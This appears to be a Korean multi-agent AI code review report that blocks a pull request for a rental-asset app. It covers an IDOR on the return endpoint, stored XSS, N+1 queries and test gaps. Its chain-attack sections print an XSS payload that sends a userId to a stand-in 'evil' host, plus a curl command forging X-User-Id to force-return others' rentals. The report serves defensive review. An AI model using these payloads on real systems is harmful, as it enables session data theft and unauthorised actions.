# 통합 코드 리뷰 리포트

> Target: `feat/review-tuni` → `main` (동일 코드 변경: `feat/return-extend`)
> Reviewer: 합의 기반 멀티 에이전트 (5 agents: security / performance / qa-test / architecture + synthesizer)
> Generated: 2026-05-28T12:39:51Z
> Commits: 6개 (f421493 반납 API / c255255 연장 API / 8075720 가용성 API / 4feb74b 반납·연장 화면+API 클라이언트 / f06e5b3 검색·필터 / 95e73ba Vitest 셋업)
> 변경: 11파일 / +355줄 / -35줄

## Executive Summary

> **이 PR이 머지되면 가장 큰 위험은 `PATCH /rentals/{id}/return`의 본인 확인 누락으로 누구나 `X-User-Id` 헤더만 바꿔 타인의 활성 대여를 일괄 강제 반납하고 즉시 빼앗듯 재대여할 수 있다는 점 — 거기에 자산 이름 `dangerouslySetInnerHTML` 렌더링이 결합되면 XSS로 userId까지 탈취되어 무인 자동화가 가능합니다.**

**결정**: ☐ Approve  ☐ Approve with comments  ☐ Request changes  ☑ **Block**

| 심각도 | 개수 | 차단 |
|---|---|---|
| Critical | 4 | 4 |
| High | 6 | 2 |
| Medium | 6 | 0 |
| Low | 5 | 0 |
| **총** | **21** | **6** |

**비계획 발견**: 6개 (PR 의도 — 반납/연장/가용성 — 외에 자연스럽게 발견)
**결합 시나리오**: 2개 (단독은 High/Medium이지만 결합 시 Critical로 승격)

**핵심 권고 (3줄)**:
- `rental_service.return_rental` / `extend_rental` 추출 한 번으로 권한 누락(SEC-1) + Router 비즈니스 로직(ARCH #1/#2/#3) + Asset.status SSoT 위반(ARCH #6) 4건이 동시에 해소됩니다 — *최우선 단일 리팩터*.
- `ReturnExtend.tsx`의 `dangerouslySetInnerHTML` 제거 + `client.ts`의 `console.error` dump 가드 — XSS→콘솔흡수→IDOR 체인(COMBO-1) 차단.
- `Rental(asset_id, user_id, returned_at)` 부분/복합 인덱스 + `GET /assets/availability/all` JOIN 단일 쿼리화 — 자산 수 선형 증가하는 핫패스 정리는 다음 이터레이션 1순위.

---

## Critical Findings (반드시 수정)

### [#1] `PATCH /rentals/{id}/return` 본인 확인 누락 — IDOR로 타인 대여 강제 반납
- **발견자**: Security Specialist + Architecture Guardian + Test Coverage Reviewer (3중 공동)
- **위치**: `backend/app/routers/rentals.py:60-78`
- **Confidence**: High
- **이슈**: 같은 PR의 `extend_rental`은 `rental.user_id != user_id`로 `403 not_your_rental`을 던지지만 `return_rental`에는 **동일 가드가 완전히 빠져 있음**. `user_id`를 `Depends(current_user)`로 받기만 하고 한 번도 사용하지 않음. 어떤 사용자든 `X-User-Id: anyone` 헤더만 보내면 타인의 활성 대여를 강제 반납하고, `asset.status="available"`로 풀려 곧바로 자기 이름으로 재대여 가능. 순차 정수 ID이므로 1..N 루프로 *모든 활성 대여*를 한 번에 무력화할 수 있음. 더해 테스트도 해피패스 1건뿐 — *부재를 검증하는 음성 테스트*가 없음.
- **수정 방향**: `rental_service.return_rental(db, rental_id, user_id)` 추출 후 Service에서 `if rental.user_id != user_id: raise HTTPException(403, "not_your_rental")`. extend와 표준 일치. 회귀 방지로 `test_return_rental_not_owner_forbidden` 추가.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: ARCHITECTURE.md §1 (Router에 비즈니스 로직 금지), §4 (권한은 Service에서), §5 (트랜잭션 경계는 Service)

### [#2] Router가 비즈니스 로직 + 권한 + 트랜잭션 모두 보유 — Service 미생성
- **발견자**: Architecture Guardian (단독 Critical 3건을 단일 뿌리로 통합)
- **위치**: `backend/app/routers/rentals.py:60-115` (return_rental, extend_rental)
- **Confidence**: High (`rental_service.py`에 return/extend 함수 없음 grep 확인)
- **이슈**: Architecture 단독 Critical 3건(§1 Router 책임 / §4 권한 위치 / §5 트랜잭션 경계)이 *모두 동일 뿌리* — `rental_service`에 `return_rental` / `extend_rental` 함수가 생성되지 않아 Router가 도메인 룰·권한·commit을 직접 보유. 파일 line 1의 코멘트가 "Router는 HTTP만"을 명시하고 있어 자기 모순.
- **수정 방향**: `rental_service.return_rental(db, rental_id, user_id)` / `rental_service.extend_rental(db, rental_id, user_id, extra_days)` 추출. 권한·검증·트랜잭션 모두 Service로. Router는 HTTP 변환만.
- **차단 여부**: **Blocking** (#1과 함께 단일 리팩터로 해소)
- **컨벤션 위반?**: ARCHITECTURE.md §1, §4, §5 (3중 위반)

### [#3] `Asset.status` 이중 상태 갱신 — Single Source of Truth 위반
- **발견자**: Architecture Guardian + Test Coverage Reviewer (공동, side-effect 미검증 측면)
- **위치**: `backend/app/routers/rentals.py:73-75` (return_rental)
- **Confidence**: High
- **이슈**: `return_rental`이 `Rental.returned_at` 기록과 동시에 `asset.status='available'`을 덮어씀. ARCHITECTURE.md §2가 *정확히 이 시나리오*를 canonical anti-example로 명시. `/assets/availability/all`이 두 상태를 AND로 판단하면 한쪽 누락 시 false negative. 더해 maintenance 상태였던 자산이 반납으로 `available`로 강제 덮어써질 수 있음 — Test reviewer가 의도 불명을 지적.
- **수정 방향**: `asset.status='available'` 라인 제거. `is_available_now`는 `returned_at IS NULL` 단일 기준으로 판정. 회귀 방지로 maintenance 자산 반납 시 status 유지 테스트 추가.
- **차단 여부**: **Blocking**
- **컨벤션 위반?**: ARCHITECTURE.md §2 SSoT (canonical anti-example과 동일)

### [#4] 자산 이름 `dangerouslySetInnerHTML` 렌더 — Stored XSS
- **발견자**: Security Specialist + Test Coverage Reviewer (공동, 회귀 테스트 부재 측면)
- **위치**: `frontend/src/pages/ReturnExtend.tsx:72`
- **Confidence**: High
- **이슈**: `<div dangerouslySetInnerHTML={{ __html: rental.asset_name ?? '(이름 없음)' }} />`로 DB에서 온 자산 이름을 그대로 HTML 주입. 백엔드 `Asset.name`은 `String(120)` 제약만 있고 sanitize 없음. fallback이 평범한 string으로 충분한데도 굳이 innerHTML 사용 — React 기본 escape를 의도적으로 우회한 명백한 결함. commit 메시지가 "XSS 회귀 TODO"를 자백한 것에 비해 `ReturnExtend.test.tsx`는 0개.
- **수정 방향**: `{rental.asset_name ?? '(이름 없음)'}`로 텍스트 렌더 변경. 필요 시 DOMPurify. `ReturnExtend.test.tsx`에 `<img onerror>` 페이로드 회귀 테스트 추가.
- **차단 여부**: **Blocking**

---

## High Priority (수정 권장)

### [#5] `extend_rental` body 무검증 + MAX_EXTEND_DAYS 경계/음수 미검증
- **발견자**: Test Coverage Reviewer (high 2건 병합)
- **위치**: `backend/app/routers/rentals.py:96-98`, `backend/tests/test_rentals.py:60-69`
- **Confidence**: High
- **이슈**: `test_extend_rental_success`는 `status_code == 200`만 확인하고 `due_at` 산술 검증 없음. 14일 초과/경계(14)/0/음수(`extra_days=-7`) 케이스 0개. 음수가 통과되면 *즉시 연체 처리* 가능 — 데이터 무결성 직접 위협.
- **수정 방향**: `due_at == due0 + timedelta(days=3)` 단언, `extra_days=15` → 400, `extra_days=14` → 200 (경계), `extra_days=-1` → 400, `extra_days=0` → 정책 결정 후 케이스. Pydantic 모델에 `ge=1, le=14` 검증.
- **차단 여부**: **Blocking** (음수 우회 위험 때문)

### [#6] `GET /assets/availability/all` N+1 쿼리 + Rental 핫컬럼 인덱스 전무
- **발견자**: Performance Analyst (high 2건 병합, Architecture #6와 동일 뿌리로 연관)
- **위치**: `backend/app/routers/assets.py:44`, `backend/app/models/rental.py:18`
- **Confidence**: High
- **이슈**: `for asset in assets:` 루프 안에서 Rental을 별도 SELECT — 1+N 쿼리. SQLite 직렬화로 자산 1,000개면 1,001회. `Rental(asset_id, user_id, returned_at)` 어디에도 인덱스 없어 매 쿼리가 풀스캔 → 총 비용은 N×풀스캔으로 폭증. Test reviewer가 같은 엔드포인트의 분기 3종(available/maintenance/active_rental) 테스트 0개를 지적해 회귀 안전망도 부재.
- **수정 방향**: `LEFT OUTER JOIN Rental ON Rental.asset_id = Asset.id AND Rental.returned_at IS NULL`로 단일 쿼리화. `Index('ix_rental_active', asset_id, postgresql_where=returned_at.is_(None))` 또는 SQLite 호환 복합 인덱스 추가. 분기 3종 테스트 동반.
- **차단 여부**: Non-blocking (현재 시드 데이터 규모에서 즉각 장애는 아님, 다음 이터레이션 최우선)

### [#7] `ReturnExtend.reload()` 프론트엔드 N+1 round-trip + `client.ts` 우회
- **발견자**: Performance Analyst + Architecture Guardian (공동, 다른 관점)
- **위치**: `frontend/src/pages/ReturnExtend.tsx:14, 18-44`
- **Confidence**: High
- **이슈**: rental마다 `/assets/{id}`를 개별 호출 — N=10/50ms RTT 환경에서 ~500ms 추가. 동시에 ReturnExtend가 `BASE` 상수와 raw `fetch`로 `client.ts`의 `authHeaders()` / `handleError`를 우회. 성능 N+1과 구조 일관성 위반이 동일 코드에서 결합.
- **수정 방향**: `client.ts`에 `returnRental` / `extendRental` / `fetchAsset` 헬퍼 추가. `reload()`는 `fetchAssets()` + `fetchMyRentals()` Promise.all 후 Map 룩업.
- **차단 여부**: Non-blocking

### [#8] 반납/연장의 404/403/400 분기 5종 전반 미검증
- **발견자**: Test Coverage Reviewer
- **위치**: `backend/tests/test_rentals.py`
- **Confidence**: High
- **이슈**: 신규 엔드포인트 2개의 예외 경로(존재하지 않는 rental_id, 타인 rental, 이미 반납됨, 미인증, 잘못된 body) 테스트 0개. 분기 커버리지 사실상 0%.
- **수정 방향**: 분기별 별도 케이스 추가. #1, #5와 함께 회귀 안전망 구축.
- **차단 여부**: Non-blocking (관련 Blocking 이슈는 #1, #5)

### [#9] `ReturnExtend.tsx` 신규 페이지 테스트 0개
- **발견자**: Test Coverage Reviewer
- **위치**: `frontend/src/pages/ReturnExtend.tsx`, `frontend/tests/` (비어있음)
- **Confidence**: High
- **이슈**: Vitest + testing-library 인프라가 95e73ba에 깔렸지만 `.test.tsx` 0개. 분기/메시지 상태/필터/`dangerouslySetInnerHTML` 회귀 모두 미검증.
- **수정 방향**: `ReturnExtend.test.tsx` 신설 (#4 페이로드 포함).
- **차단 여부**: Non-blocking

### [#10] `list_assets_with_availability` 분기 3종 미검증
- **발견자**: Test Coverage Reviewer
- **위치**: `backend/app/routers/assets.py:45-65`
- **Confidence**: High
- **이슈**: available / active rental / maintenance 분기 0개 테스트. #3 (SSoT 위반)이 false negative를 만들 때 회귀 잡을 안전망 없음.
- **수정 방향**: `test_availability_{available,maintenance,active_rental}` 추가.
- **차단 여부**: Non-blocking

---

## Combined Risks (결합 시나리오)

### [COMBO-1] XSS → 콘솔 dump 흡수 → userId 탈취 → IDOR 대량 반납 (체인 공격)
- **발견자**: Security Specialist (체인 구성)
- **결합 발견**: #4 (XSS, High) + SEC-3 (`handleError` 정보 노출, Medium) + #1 (return IDOR, Critical)
- **결합 시 심각도**: **Critical** (단독은 High + Medium + Critical, 체인이 무인 자동화 가능하게 함)
- **공격/실패 경로**:
  1. 악의적 자산 등록자가 `Asset.name = "<img src=x onerror=fetch('https://evil/?u='+localStorage.getItem('userId'))>` 저장
  2. 피해자 `/return-extend` 진입 → `dangerouslySetInnerHTML`로 페이로드 실행
  3. `client.ts`의 `console.error`가 URL/userId/응답 본문/헤더를 dump → onerror가 console hook으로 수거 가능
  4. 수집된 userId를 `X-User-Id`로 위조 → `PATCH /rentals/{1..N}/return` 루프 → 모든 활성 대여 강제 반납
  5. 즉시 자기 이름으로 재대여 (asset.status='available' 덮어쓰기 덕에 후속 POST가 통과 — #3과도 결합)
- **권고**: #1, #3, #4를 *모두 수정*해야 체인 차단. SEC-3 가드는 다음 이터레이션이라도 즉시 권장.

### [COMBO-2] 순차 ID + 반납 IDOR + `availability/all` 인증 부재 = 정찰→대량 탈취
- **발견자**: Security Specialist
- **결합 발견**: #1 (return IDOR, Critical) + UNPLANNED-1 (`GET /assets/availability/all` 인증 없음, Medium)
- **결합 시 심각도**: **High** (단독 Critical + Medium, 결합 시 정찰 자동화)
- **공격/실패 경로**: `/assets/availability/all`로 인증 없이 모든 활성 대여의 `due_at` 목록 수집 → 순차 정수 ID와 결합해 *어떤 rental이 활성인지* 사전 정찰 → #1로 정밀 강제 반납.
- **권고**: #1 수정과 별개로 `/assets/availability/all`에 `Depends(current_user)` 추가.

---

## Unplanned Findings (비계획 발견)

PR 의도(반납/연장/가용성 API + 화면)와 무관하게 자연스럽게 잡힌 항목.

- **[UNPLANNED-1]** `GET /assets/availability/all`이 인증 데코레이터 없이 모든 자산의 활성 대여 `due_at` 노출 — Security / `backend/app/routers/assets.py:43-55`
- **[UNPLANNED-2]** `MyRentals.tsx` 필터 `useEffect` 의존성 배열 누락 (`[]`이지만 내부에서 filter 읽음) — 필터 클릭해도 갱신 안 됨 — Test / `frontend/src/pages/MyRentals.tsx:11-22`
- **[UNPLANNED-3]** `ReturnExtend.tsx`의 "7일 연장" 버튼이 실제로는 `handleExtend(rental.id, 3)` 호출 — UI 라벨과 동작 불일치 — Security / `frontend/src/pages/ReturnExtend.tsx:56`
- **[UNPLANNED-4]** `AssetList.tsx`가 `key={index}` + 매 렌더 필터/정렬 재계산 — React 전체 unmount/remount — Performance + Security (공동, 다른 관점) / `frontend/src/pages/AssetList.tsx:62`
- **[UNPLANNED-5]** `fetchActiveAssetsForUser`의 `'!activeAssetIds.has(id) || status === available'` OR 조건이 의도와 일치하는지 불명, 테스트 부재로 잠재 결함 — Test / `frontend/src/api/client.ts:53-60`
- **[UNPLANNED-6]** `fetchActiveAssetsForUser`의 `fetchAssets` + `fetchMyRentals` 직렬 await (Promise.all 가능) — Performance / `frontend/src/api/client.ts:38`

---

## Medium / Low (참고)

> 다음 이터레이션에서 다룰 항목들.

- **[#11/Medium]** `handleError`가 헤더 전체/응답 본문/URL/userId를 `console.error`로 광범위 노출 — Security SEC-3 / `frontend/src/api/client.ts:25-41` / Non-blocking (단독 Medium, COMBO-1 결합 시 Critical)
- **[#12/Medium]** `fetchAssets()`가 transport + presentation 혼합 (SRP), file header가 "+ 표시용 가공 헬퍼"로 위반 자백 — Architecture / `frontend/src/api/client.ts:256-258` / Non-blocking
- **[#13/Medium]** `test_return_rental_success`가 `asset.status='available'` 덮어쓰기 side-effect 미검증, maintenance 덮어쓰기 의도 불명 — Test / `backend/tests/test_rentals.py:51-57` / Non-blocking (#3과 연관)
- **[#14/Medium]** `handleError` 헬퍼 경로(비-JSON, JSON.parse 실패, console 사이드이펙트, throw) 0개 테스트 — Test / `frontend/src/api/client.ts:25-41` / Non-blocking
- **[#15/Medium]** `AssetList`: `useMemo`/`key={asset.id}` 부재로 키 입력당 60-80% 재조정 비용 — Performance / `frontend/src/pages/AssetList.tsx:62` / Non-blocking (UNPLANNED-4와 동일 위치)
- **[#16/Medium]** `AssetRow.meta.filters` ISP 위반 — prop 수신 후 미사용 — Architecture / `frontend/src/pages/AssetList.tsx:383-394` / Non-blocking
- **[#17/Low]** CORS `allow_credentials=True` + `allow_methods=["*"]` — Security SEC-5 / `backend/app/main.py:23-29` / Non-blocking
- **[#18/Low]** `X-User-Id` 클라이언트 신뢰 인증 모델 — 워크숍 명시 전제 — Security SEC-6 / `backend/app/auth.py:5-11` / Non-blocking (전제)
- **[#19/Low]** `ReturnExtend.tsx` `authHeaders` 분기 비일관 (`?? ''` 빈 문자열) — Security SEC-4 / `frontend/src/pages/ReturnExtend.tsx:18-44` / Non-blocking
- **[#20/Low]** `fetchAssets` 중복 정렬 (backend + client + AssetList 3중) — Performance / `frontend/src/api/client.ts:32` / Non-blocking
- **[#21/Low]** 테스트 격리 문제: 시드 `asset_id` 하드코딩 + Vitest setup이 `userId` 항상 셋팅 → 비로그인 분기 테스트 어려움 — Test (low 2건 병합) / Non-blocking

---

## 충돌 해결 기록

| 항목 | 충돌 내용 | 결정 | 이유 |
|---|---|---|---|
| — | 이번 리뷰엔 리뷰어 간 명시적 충돌 없음. 4개 도메인이 권한(#1)·SSoT(#3)·XSS(#4)·N+1(#6/#7)·구조(#2)에서 *모두 일관*된 방향. 차이는 각 도메인의 강조점뿐. | (해당 없음) | 충돌 시 기본 원칙(안전·보안 우선)도 발동 불필요 |

---

## 다음 이터레이션 후보

> 이번 PR엔 Non-blocking이지만 다음 PR에서 다루면 좋은 항목.

- `Rental(asset_id, user_id, returned_at)` 부분/복합 인덱스 추가 (#6 후반부) — 가용성 라우터 JOIN 단일 쿼리화와 함께 묶어 단일 PR
- `handleError` 정보 노출 가드 + 프로덕션 `console.error` 축약 (#11) — COMBO-1 차단의 *세 번째* 잠금장치
- `client.ts` SRP 정리: `fetchAssets`에서 sort/filter 제거 + `returnRental` / `extendRental` / `fetchAsset` 헬퍼 추가 (#12, #7) — 일관성 회복
- `MyRentals` 필터 `useEffect` deps 누락 수정 + 회귀 테스트 (UNPLANNED-2)
- "7일 연장" 버튼 라벨/동작 일치 (UNPLANNED-3) — UI 신뢰성
- `AssetList`의 `useMemo` + `key={asset.id}` (#15) — 검색 UX
- `fetchActiveAssetsForUser` OR 조건 검증 테스트 + Promise.all 병렬화 (UNPLANNED-5, UNPLANNED-6) — 한 번에 묶기 좋음
- 분기 커버리지(반납/연장/가용성) 일괄 보강 (#8, #10)
- CORS 정책 타이트닝 (#17)

---

## 리뷰어별 원본 발견 사항

<details>
<summary>Security Review (security-reviewer)</summary>

```
## Security Review

### 발견 사항

#### [SEC-1] 반납(`PATCH /rentals/{id}/return`) 엔드포인트에 본인 확인 누락 — IDOR
- 위치: backend/app/routers/rentals.py:60-75
- 심각도: Critical / Confidence: High / 영역: P1 인증/권한
- 이슈: extend_rental은 rental.user_id != user_id 검증으로 403 not_your_rental을 던지지만, return_rental에는 검증이 완전히 빠져 있음. user_id를 Depends(current_user)로 주입받기만 하고 한 번도 사용하지 않음. 어떤 사용자든 X-User-Id: anyone 헤더만 보내면 남의 활성 대여를 강제 반납 가능하고, asset.status까지 "available"로 바꿔 곧바로 자기가 빼앗듯 재대여하는 흐름이 만들어짐.
- 공격 시나리오: Eve가 curl -X PATCH /rentals/123/return -H "X-User-Id: eve"로 Alice 대여 강제 반납. 순차 정수 ID로 1..N 루프 가능.
- 수정: Service로 옮기고 권한 검증 / 차단: Yes / 컨벤션 위반: ARCH §4, §1

#### [SEC-2] dangerouslySetInnerHTML — Stored XSS
- 위치: frontend/src/pages/ReturnExtend.tsx:72 / 심각도: High / Confidence: High
- 이슈: rental.asset_name을 innerHTML로 주입. Asset.name은 String(120)만 제한, sanitize 없음. fallback이 평범한 string이므로 굳이 innerHTML 쓸 이유 없음.
- 공격: name="<img src=x onerror=fetch('https://evil/?u='+localStorage.getItem('userId'))>" / 차단: Yes

#### [SEC-3] handleError 민감 정보 광범위 노출
- 위치: frontend/src/api/client.ts:25-41 / 심각도: Medium / Confidence: High
- 이슈: console.error로 헤더/본문/URL/userId 묶어 출력. SEC-2 XSS 결합 시 Critical (COMBO-1).
- 차단: No

#### [SEC-4] ReturnExtend가 client.ts 우회
- 위치: ReturnExtend.tsx:18-44 / Low / Confidence: Medium / 차단: No

#### [SEC-5] CORS allow_credentials=True + allow_methods=["*"]
- 위치: backend/app/main.py:23-29 / Low / 차단: No

#### [SEC-6] X-User-Id 클라이언트 신뢰 (워크숍 전제)
- 위치: backend/app/auth.py:5-11 / Critical(프로덕션)/N/A(전제) / 차단: No

### 결합 시나리오
- [COMBO-1] SEC-2 + SEC-3 + SEC-1: XSS → 콘솔 dump 흡수 → userId 탈취 → IDOR 대량 반납 → Critical
- [COMBO-2] SEC-1 + /assets/availability/all 인증 부재 → High

### 비계획 발견
- [UNPLANNED-SEC-1] /assets/availability/all 인증 없이 활성 대여 due_at 노출 (assets.py:43-55)
- [UNPLANNED-SEC-2] AssetList의 key={index}
- [UNPLANNED-SEC-3] "7일 연장" 버튼이 실제 handleExtend(rental.id, 3) 호출 — 라벨/동작 불일치

### 요약: 총 6 (Critical 1 / High 1 / Medium 1 / Low 3) + 비계획 3 / 차단 2 / 결합 2
```

</details>

<details>
<summary>Performance Review (performance-reviewer)</summary>

```json
{
  "domain": "performance",
  "summary": "신규 가용성 라우터와 ReturnExtend 화면 양쪽 모두에 명확한 N+1 패턴, 핫패스 의존 Rental 컬럼에 인덱스 전무.",
  "findings": [
    {"severity":"high","title":"GET /assets/availability/all 의 N+1 쿼리","file":"backend/app/routers/assets.py:44","description":"for asset in assets 루프 안에서 Rental 별도 SELECT — 1+N 쿼리.","impact":"자산 1,000개면 1,001회. SQLite 직렬화로 응답시간이 자산 수에 선형 증가.","recommendation":"LEFT OUTER JOIN 으로 단일 쿼리화.","estimated_gain":"쿼리 수 1+N → 1, 자산 1,000개 기준 ~90% 단축"},
    {"severity":"high","title":"ReturnExtend.reload() 의 프론트엔드 N+1 round-trip","file":"frontend/src/pages/ReturnExtend.tsx:14","description":"rental 마다 /assets/{id} 개별 호출. 브라우저 동시 커넥션 제한.","impact":"N=10/50ms RTT 환경 ~500ms 추가.","recommendation":"fetchAssets() 한 번 + Map 룩업.","estimated_gain":"HTTP 요청 수 1+N → 2"},
    {"severity":"high","title":"Rental 테이블 핫컬럼에 인덱스 전무","file":"backend/app/models/rental.py:18","description":"asset_id/user_id/returned_at 인덱스 없음. 모든 핫패스 풀스캔.","impact":"rental 누적 시 list_assets_with_availability가 N×풀스캔으로 폭증.","recommendation":"부분/복합 인덱스 추가.","estimated_gain":"단일 조회 O(N)→O(log N), JOIN 후 추가 ~5~20배 단축"},
    {"severity":"medium","title":"fetchActiveAssetsForUser 의 직렬 await — 병렬화 가능","file":"frontend/src/api/client.ts:38","description":"fetchAssets 와 fetchMyRentals 가 서로 독립인데 직렬.","recommendation":"Promise.all 병렬.","estimated_gain":"~40~50% 단축"},
    {"severity":"medium","title":"AssetList: key={index} + 매 렌더 정렬/필터로 인한 불필요 재조정","file":"frontend/src/pages/AssetList.tsx:62","description":"visible 매 렌더 계산 + key={index} 로 React 전체 unmount/remount.","recommendation":"useMemo, key={asset.id}.","estimated_gain":"키 입력당 ~60~80% 단축, DOM mutation ~90% 감소"},
    {"severity":"low","title":"fetchAssets 의 중복 정렬","file":"frontend/src/api/client.ts:32","description":"백엔드/client/AssetList 3중 sort.","recommendation":"client.ts sort 제거.","estimated_gain":"500개 기준 ~5~10ms 절감"}
  ],
  "score": 52
}
```

5가지 차원: 비계획(key={index}, 직렬 await, 중복 sort) / 연쇄(AssetList→availability 호출 시 N+1+풀스캔 폭발, 인덱스 미흡 → create_rental 중복 체크도 풀스캔) / 결합(성능+동시성, 성능+캐시 부재, 성능+SSoT → reload 폭증)

</details>

<details>
<summary>Test Coverage Review (qa-test-reviewer)</summary>

```json
{
  "domain": "testing",
  "summary": "신규 엔드포인트 3개와 신규 페이지 1개 추가됐으나 백엔드는 해피 패스 2건(약한 단언)만, 프론트는 인프라만 깔리고 .test.tsx 0개. 분기/예외/권한/경계값 거의 전부 미검증.",
  "findings": [
    {"severity":"critical","title":"return_rental 권한 체크 없는데 테스트도 부재를 검증 안 함","file":"backend/app/routers/rentals.py:60-78, backend/tests/test_rentals.py:51-57","description":"extend엔 있는 403 가드가 return엔 없음. 테스트는 해피 패스만.","impact":"X-User-Id 위조로 타인 대여 강제 반납 + 즉시 재대여 가능. 정합성 사고 직결.","recommendation":"test_return_rental_not_owner_forbidden 추가."},
    {"severity":"high","title":"test_extend_rental_success 가 body 미검증","file":"backend/tests/test_rentals.py:60-69","description":"200만 확인, due_at 산술 검증 없음."},
    {"severity":"high","title":"extend_rental MAX_EXTEND_DAYS 경계/예외 0개","file":"backend/app/routers/rentals.py:96-98","description":"14일 초과/경계/0/음수 0개. 음수면 즉시 연체."},
    {"severity":"high","title":"반납/연장 404/403/400 분기 0개","file":"backend/tests/test_rentals.py"},
    {"severity":"high","title":"ReturnExtend.tsx 테스트 0개","file":"frontend/src/pages/ReturnExtend.tsx","description":"분기/메시지/필터/dangerouslySetInnerHTML 모두 미검증. commit이 XSS 회귀 TODO 자백."},
    {"severity":"high","title":"list_assets_with_availability 분기 미검증","file":"backend/app/routers/assets.py:45-65","description":"available/active/maintenance 0개."},
    {"severity":"medium","title":"test_return_rental_success side-effect 미검증","description":"asset.status='available' 덮어쓰기 미검증."},
    {"severity":"medium","title":"handleError 헬퍼 경로 미검증","file":"frontend/src/api/client.ts:25-41"},
    {"severity":"medium","title":"fetchActiveAssetsForUser 합성 로직 미검증","description":"OR 조건 의도 불명."},
    {"severity":"medium","title":"MyRentals.tsx filter useEffect deps 누락","file":"frontend/src/pages/MyRentals.tsx:11-22"},
    {"severity":"low","title":"테스트 격리: 시드 asset_id 하드코딩"},
    {"severity":"low","title":"Vitest setup beforeEach가 userId 항상 셋팅"}
  ],
  "coverage_gaps":["return 권한","return 404/400","return side-effect","extend 404/403/400/MAX","extend 경계","extend 음수","extend body","availability 분기 3종","ReturnExtend.tsx 0개","handleError 분기","fetchActiveAssetsForUser 4 케이스","MyRentals 필터","AssetList 검색/필터/정렬"],
  "score": 28
}
```

5차원: 계획된 결함(권한 비대칭, body 무검증, MAX 0개, XSS 회귀 TODO, extra_days 음수) / 비계획(in-memory SQLite 동시성, MyRentals deps, fetchActiveAssetsForUser OR) / 연쇄(권한→정합성, body→산술 회귀, 분기→UX 회귀) / 결합(권한+status 덮어쓰기=도용 Critical, MAX+음수=즉시 연체)

</details>

<details>
<summary>Architecture Review (acm-architect-reviewer)</summary>

```
## Architecture Conformance Review

#### [CRITICAL] Router performs business logic, bypasses Service
- 위치: backend/app/routers/rentals.py 60-115 (return_rental, extend_rental)
- 규칙: ARCH §1 / Confidence: High (rental_service.py에 return/extend 없음 grep 확인)
- 수정: rental_service.return_rental / extend_rental 추출

#### [CRITICAL] Authorization ownership misplaced; return path unprotected
- 위치: rentals.py:91 (extend가 Router에서 체크) + 60-78 (return은 체크 자체 없음)
- 규칙: ARCH §4 — 문서가 정확히 이 예시 사용
- 수정: Service로 이동 + 두 함수 동일 표준

#### [CRITICAL] Transaction boundary owned by Router
- 위치: rentals.py:76, :101
- 규칙: ARCH §5

#### [MAJOR] fetchAssets()가 transport + presentation 혼합 (SRP)
- 위치: frontend/src/api/client.ts:256-258
- file header가 "+ 표시용 가공 헬퍼"로 SRP 위반 자백
- 수정: filter/sort 제거 → AssetList의 visible로

#### [MAJOR] ReturnExtend.tsx 가 client.ts 우회
- 위치: ReturnExtend.tsx:5, 19, 32, 41 (BASE 중복 + raw fetch)
- 수정: returnRental/extendRental/fetchAsset 헬퍼를 client.ts에

#### [MAJOR] Asset.status 이중 상태 갱신 — SSoT 위반
- 위치: rentals.py:73-75 (return_rental이 returned_at + asset.status 동시 기록)
- 규칙: ARCH §2 — 문서가 정확히 이 시나리오를 canonical anti-example로 명시
- 수정: asset.status='available' 제거. is_available_now도 returned_at만으로 판단.

#### [MINOR] AssetRow.meta.filters ISP 위반
- 위치: AssetList.tsx:383-394 + 74-79

### Summary: 7 findings (Critical 3 / Major 3 / Minor 1) / Verdict: DOES NOT CONFORM
### Top: 1/2/3 모두 동일 뿌리(rental_service 미생성). 한 번의 추출로 3건 해소.
```

</details>
